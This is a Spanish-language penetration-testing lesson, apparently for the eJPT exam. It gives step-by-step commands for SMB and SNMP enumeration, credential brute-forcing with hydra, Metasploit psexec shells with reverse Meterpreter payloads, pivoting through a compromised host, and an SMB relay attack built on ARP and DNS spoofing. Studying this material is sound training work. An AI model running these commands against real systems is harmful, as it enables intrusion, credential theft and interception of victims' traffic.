# Network Attacks

Esta lección cubre técnicas prácticas de ataque basadas en red — enumeración SMB/NetBIOS, enumeración SNMP, pivoting a través de sistemas comprometidos y ataques de retransmisión SMB. Son habilidades fundamentales para el módulo de pentesting de red del eJPT.

> ⚠️ **Nota**: Todos los comandos asumen que operas desde una máquina de ataque **Kali Linux**. Reemplaza las IPs y valores con la información real de tu objetivo.

---

## 1. SMB & NetBIOS Enumeration

### ¿Qué es SMB?

**SMB (Server Message Block)** proporciona compartición de archivos e impresoras, tuberías con nombre y comunicación entre procesos (IPC). Permite a los usuarios acceder a archivos en ordenadores remotos como si fueran locales.

| Versión SMB | Introducida Con | Cambios Clave |
|-------------|----------------|---------------|
| **SMB 1.0** | Windows XP | Versión original — vulnerabilidades críticas (EternalBlue) |
| **SMB 2.0/2.1** | Windows Vista / Server 2008 | Rendimiento y seguridad mejorados |
| **SMB 3.0+** | Windows 8 / Server 2012 | Cifrado, soporte multicanal, mejoras para virtualización |

**Puertos clave**:
- **Puerto 445** — Tráfico SMB directo (bypasea NetBIOS)
- **Puerto 139** — SMB sobre NetBIOS (necesario para compatibilidad retroactiva)

### ¿Qué es NetBIOS?

**NetBIOS (Network Basic Input/Output System)** es una API y un conjunto de protocolos de red para la comunicación en redes locales. Permite que las aplicaciones en diferentes ordenadores se encuentren e interactúen.

| Servicio | Puerto | Protocolo | Propósito |
|---------|--------|-----------|-----------|
| **Name Service (NetBIOS-NS)** | 137 | UDP/TCP | Registrar, cancelar y resolver nombres en la LAN |
| **Datagram Service (NetBIOS-DGM)** | 138 | UDP | Comunicación sin conexión y broadcasting |
| **Session Service (NetBIOS-SSN)** | 139 | TCP | Comunicación orientada a conexión para transferencias fiables |

> Windows moderno usa principalmente SMB con DNS para la resolución de nombres, pero NetBIOS sobre el puerto 139 sigue habilitado para compatibilidad retroactiva.

---

### Flujo de Trabajo de Enumeración SMB/NetBIOS

#### Paso 1: Escaneo Nmap Inicial

```bash
nmap -sV -sC -p 139,445 <target_ip>
```

#### Paso 2: Escanear Información de Nombres NetBIOS

```bash
# Escaneo NetBIOS
nbtscan <target_ip>

# Alternativa — consultar una IP específica
nmblookup -A <target_ip>
```

#### Paso 3: Enumerar la Versión del Protocolo SMB

```bash
nmap -sV -p 445 --script=smb-protocols <target_ip>
```

La salida indica qué versiones de SMB acepta el objetivo (SMBv1, v2, v3).

#### Paso 4: Comprobar el Nivel de Seguridad SMB

```bash
nmap -sV -p 445 --script=smb-security-mode <target_ip>
```

Buscar:
- **Firma de mensajes deshabilitada** — vulnerable a ataques de retransmisión
- **Nivel de autenticación** — ¿acceso de invitado/anónimo habilitado?

#### Paso 5: Encontrar Todos los Scripts Nmap de SMB

```bash
ls -al /usr/share/nmap/scripts/ | grep -e "smb"
```

#### Paso 6: Probar el Login Anónimo con smbclient

```bash
# Listar recursos compartidos disponibles anónimamente
smbclient -L //<target_ip> -N

# Conectarse a un recurso compartido específico
smbclient //<target_ip>/<nombre_compartido> -N
```

`-N` = sin contraseña (login anónimo). Si tiene éxito, puedes ver todos los nombres de los recursos compartidos.

#### Paso 7: Enumerar Usuarios SMB

Si SMBv1 está en ejecución y el acceso anónimo está permitido:

```bash
nmap -sV -p 445 --script=smb-enum-users <target_ip>
```

Guarda los nombres de usuario descubiertos en un archivo:

```bash
echo "admin
bob
administrator" > users.txt
```

#### Paso 8: Fuerza Bruta de Credenciales SMB

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>
```

O con Metasploit:

```bash
msfconsole
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS <target_ip>
msf6 > set USER_FILE users.txt
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run
```

#### Paso 9: Obtener Shell con PsExec

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser <nombre_usuario>
msf6 > set SMBPass <contraseña>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <tu_ip>
msf6 > exploit
```

---

### Pivoting hacia un Segundo Objetivo

Una vez que tienes una sesión Meterpreter en la primera máquina, puedes hacer pivoting para alcanzar sistemas internos no accesibles directamente desde Kali.

#### Paso 1: Descubrir el Segundo Objetivo

```bash
meterpreter > shell
C:\> ping <target2_ip>
```

#### Paso 2: Configurar la Ruta de Red

```bash
meterpreter > run autoroute -s <subred_del_target2>
# Ejemplo: run autoroute -s <target_network>/24
```

#### Paso 3: Configurar el Proxy SOCKS

```bash
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
```

#### Paso 4: Escanear el Objetivo 2 a Través del Túnel

```bash
# Editar /etc/proxychains.conf para incluir:
# socks5 127.0.0.1 1080

proxychains nmap <target2_ip> -sT -Pn -sV -p 445
```

`-sT` (escaneo de conexión TCP) es necesario a través de proxychains — los escaneos SYN no funcionan a través de un proxy.

#### Paso 5: Acceder a los Recursos Compartidos del Objetivo 2

```bash
# Desde la primera sesión de meterpreter shell
meterpreter > shell

# Ver los recursos de red compartidos disponibles
C:\> net view \\<target2_ip>

# Mapear un recurso compartido remoto a una letra de unidad local
C:\> net use D: \\<target2_ip>\<nombre_compartido>

# Navegar por la unidad mapeada
C:\> dir D:\
```

---

### Referencia Rápida de Enumeración SMB

| Tarea | Comando |
|-------|---------|
| Escanear puertos SMB | `nmap -sV -p 139,445 <target_ip>` |
| Escaneo NetBIOS | `nbtscan <target_ip>` |
| Enumerar versión SMB | `nmap --script=smb-protocols -p 445 <target_ip>` |
| Comprobar modo de seguridad | `nmap --script=smb-security-mode -p 445 <target_ip>` |
| Enumerar usuarios | `nmap --script=smb-enum-users -p 445 <target_ip>` |
| Listar recursos anónimamente | `smbclient -L //<target_ip> -N` |
| Fuerza bruta de credenciales | `hydra -L users.txt -P rockyou.txt smb://<target_ip>` |
| Obtener shell vía PsExec | `exploit/windows/smb/psexec` |

---

## 2. SNMP Enumeration

### ¿Qué es SNMP?

**SNMP (Simple Network Management Protocol)** es un protocolo ampliamente usado para monitorizar y gestionar dispositivos en red — routers, switches, servidores, impresoras. Permite a los administradores consultar el estado de los dispositivos, configurar ajustes y recibir alertas.

**Arquitectura**:

| Componente | Rol |
|-----------|-----|
| **Gestor SNMP** | Sistema que consulta e interactúa con los agentes SNMP |
| **Agente SNMP** | Software en los dispositivos de red que responde a consultas y envía traps |
| **MIB (Management Information Base)** | Base de datos jerárquica que define los datos disponibles — cada entrada tiene un **OID (Object Identifier)** único |

**Versiones de SNMP**:

| Versión | Autenticación | Seguridad |
|---------|--------------|-----------|
| **v1** | Cadenas de comunidad (texto plano) | Débil — sin cifrado |
| **v2c** | Cadenas de comunidad (texto plano) | Transferencias en bloque mejoradas, sigue siendo débil |
| **v3** | Autenticación basada en usuario | Cifrado + integridad de mensajes — más seguro |

**Puertos clave**:
- **Puerto 161 (UDP)** — Consultas SNMP
- **Puerto 162 (UDP)** — Traps SNMP (notificaciones enviadas al gestor)

**Cadenas de comunidad por defecto** (actúan como contraseñas):
- `public` — acceso de solo lectura (el más común por defecto)
- `private` — acceso de lectura/escritura

> En las pruebas de penetración, adivinar o forzar las cadenas de comunidad suele ser el primer paso — otorgan acceso a todos los datos SNMP del dispositivo.

---

### Flujo de Trabajo de Enumeración SNMP

#### Paso 1: Detectar SNMP con Nmap

```bash
nmap -sU -p 161 <target_ip>
```

Se requiere escaneo UDP — SNMP corre en UDP 161.

#### Paso 2: Fuerza Bruta de Cadenas de Comunidad

```bash
nmap -sU -p 161 --script=snmp-brute <target_ip>
```

O con Metasploit:

```bash
msfconsole
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 > set RHOSTS <target_ip>
msf6 > run
```

#### Paso 3: Extraer Información con snmpwalk

```bash
# Recorrer el árbol SNMP completo
snmpwalk -v <versión> -c <cadena_comunidad> <target_ip>

# Ejemplo con v1 y cadena de comunidad "public"
snmpwalk -v 1 -c public <target_ip>

# Ejemplo con v2c
snmpwalk -v 2c -c public <target_ip>
```

**OIDs clave para pentesting**:

| OID | Información Obtenida |
|-----|---------------------|
| `1.3.6.1.2.1.1` | Info del sistema (hostname, SO, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Procesos en ejecución |
| `1.3.6.1.2.1.25.6.3.1.2` | Software instalado |
| `1.3.6.1.2.1.6.13.1.3` | Puertos TCP abiertos |
| `1.3.6.1.4.1.77.1.2.25` | Cuentas de usuario de Windows |

#### Paso 4: Ejecutar Todos los Scripts SNMP de Nmap

```bash
nmap -sU -p 161 --script snmp-* <target_ip> > snmp_info.txt
```

Esto vuelca todo lo que SNMP expone — info del sistema, usuarios, procesos en ejecución, interfaces de red, software instalado.

#### Paso 5: Aprovechar los Datos SNMP para Ataques Posteriores

Tras extraer nombres de usuario de SNMP:

```bash
# Fuerza bruta con nombres de usuario descubiertos
hydra -L snmp_users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>

# O usar el módulo PsExec de Metasploit con las credenciales encontradas
msf6 > use exploit/windows/smb/psexec
```

---

### Referencia Rápida de Enumeración SNMP

| Tarea | Comando |
|-------|---------|
| Detectar SNMP | `nmap -sU -p 161 <target_ip>` |
| Fuerza bruta de cadenas de comunidad | `nmap -sU -p 161 --script=snmp-brute <target_ip>` |
| Recorrer árbol SNMP | `snmpwalk -v 1 -c public <target_ip>` |
| Ejecutar todos los scripts SNMP | `nmap -sU -p 161 --script snmp-* <target_ip>` |
| Extraer usuarios (Windows) | OID `1.3.6.1.4.1.77.1.2.25` vía snmpwalk |

---

## 3. SMB Relay Attack

### ¿Qué es un Ataque de Retransmisión SMB?

Un **ataque de retransmisión SMB** es un ataque de Hombre en el Medio (MitM) donde el atacante intercepta el tráfico de autenticación SMB, captura los hashes NTLM y los **retransmite** a otro servidor para obtener acceso no autorizado — sin necesidad de crackear el hash.

```
Cliente → [envía hash NTLM para conectarse al servidor] → El atacante intercepta
Atacante → retransmite el hash al Servidor Objetivo → obtiene acceso como el cliente
```

**Por qué funciona**: La autenticación NTLM es basada en desafío-respuesta. El hash en sí mismo es suficiente para autenticarse — no se necesita la contraseña en texto plano.

**Requisitos previos**:
- Firma SMB **deshabilitada** en el objetivo (comprobar con el script `smb-security-mode`)
- El atacante puede interceptar el tráfico (ARP spoofing, envenenamiento DNS, o servidor rogue)

---

### Flujo de Trabajo del Ataque de Retransmisión SMB

#### Paso 1: Configurar la Retransmisión SMB en Metasploit

```bash
msfconsole
msf6 > use exploit/windows/smb/smb_relay
msf6 > set SRVHOST <tu_ip>
msf6 > set LHOST <tu_ip>
msf6 > set SMBHOST <ip_objetivo_final>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > exploit -j
```

Esto configura un servidor SMB rogue esperando capturar y retransmitir hashes NTLM.

#### Paso 2: Crear Registros de Envenenamiento DNS

Crear un archivo apuntando el dominio objetivo a tu máquina:

```bash
echo "<tu_ip> *.dominio-objetivo.com" > dns_records
```

#### Paso 3: Habilitar el Reenvío IP

Necesario para que el tráfico legítimo siga fluyendo mientras interceptas:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Paso 4: Iniciar el Envenenamiento DNS

```bash
dnsspoof -i eth1 -f dns_records
```

Falsifica las respuestas DNS — cuando la víctima busca el dominio objetivo, DNS devuelve tu IP.

#### Paso 5: Configurar el Envenenamiento ARP (Dos Terminales)

El envenenamiento ARP te posiciona entre la víctima y el gateway:

```bash
# Terminal 1 — envenenar la caché ARP de la víctima (decirle a la víctima: el gateway está en tu MAC)
arpspoof -i eth1 -t <victim_ip> <gateway_ip>

# Terminal 2 — envenenar la caché ARP del gateway (decirle al gateway: la víctima está en tu MAC)
arpspoof -i eth1 -t <gateway_ip> <victim_ip>
```

**Cómo funciona la cadena de ataque completa**:
1. ARP spoofing → todo el tráfico de la víctima pasa por tu máquina.
2. DNS spoofing → la conexión SMB de la víctima al dominio objetivo es redirigida a tu servidor rogue.
3. Módulo SMB relay → captura el hash NTLM y lo retransmite al servidor objetivo real.
4. Obtienes una sesión Meterpreter en el servidor objetivo autenticado como la víctima.

#### Paso 6: Verificar y Usar la Sesión

```bash
msf6 > sessions -l
msf6 > sessions -i <session_id>
meterpreter > getuid
meterpreter > sysinfo
```

---

### Resumen del Ataque de Retransmisión SMB

| Paso | Herramienta | Propósito |
|------|------------|-----------|
| **Configurar relay** | Metasploit `smb_relay` | Servidor SMB rogue para capturar/retransmitir hashes NTLM |
| **Habilitar reenvío IP** | `echo 1 > /proc/sys/net/ipv4/ip_forward` | Permitir que el tráfico pase por la máquina del atacante |
| **Envenenamiento DNS** | `dnsspoof` | Redirigir las solicitudes de dominio de la víctima al atacante |
| **Envenenamiento ARP** | `arpspoof` | Posicionar al atacante entre la víctima y el gateway |
| **Resultado** | Sesión Meterpreter | Acceso autenticado como el usuario víctima |

---

## Puntos Clave

- **SMB** opera en los puertos **445** (directo) y **139** (sobre NetBIOS) — siempre escanea ambos.
- **SMBv1** es peligroso — soporta enumeración anónima y es vulnerable a EternalBlue. Identifícalo con `smb-protocols`.
- El **login SMB anónimo** (`smbclient -L //<ip> -N`) revela recursos compartidos y, combinado con `smb-enum-users`, expone cuentas de usuario.
- Siempre comprueba el **modo de seguridad SMB** (`smb-security-mode`) — la firma de mensajes deshabilitada = vulnerable a ataques de retransmisión.
- **Pivoting**: usa `autoroute` + `socks_proxy` + `proxychains` para alcanzar objetivos internos a través de una máquina comprometida.
- Al hacer pivoting, usa **`-sT` (TCP connect)** con proxychains — los escaneos SYN no funcionan a través de proxies SOCKS.
- Usa `net view` y `net use` en la máquina Windows comprometida para acceder a recursos compartidos en objetivos internos.
- **SNMP** corre en **UDP puerto 161** — siempre usa `-sU` al escanear.
- Las cadenas de comunidad SNMP por defecto son `public` (lectura) y `private` (escritura) — fuerza bruta con `snmp-brute` o `snmpwalk`.
- **`snmpwalk`** extrae info del sistema, procesos en ejecución, software instalado, puertos abiertos y cuentas de usuario.
- Ejecuta todos los scripts SNMP a la vez: `nmap -sU -p 161 --script snmp-* <ip>` — guarda la salida para análisis offline.
- Los **ataques de retransmisión SMB** interceptan hashes NTLM y los reproducen — sin necesidad de crackear contraseñas.
- El relay SMB requiere: firma SMB **deshabilitada** en el objetivo + posición MitM (ARP + envenenamiento DNS).
- La cadena de ataque: `arpspoof` (MitM) → `dnsspoof` (redirigir tráfico) → `smb_relay` (capturar y retransmitir hash NTLM) → sesión Meterpreter.
- Siempre habilita el **reenvío IP** (`echo 1 > /proc/sys/net/ipv4/ip_forward`) antes del ARP spoofing para no cortar el tráfico de la víctima.
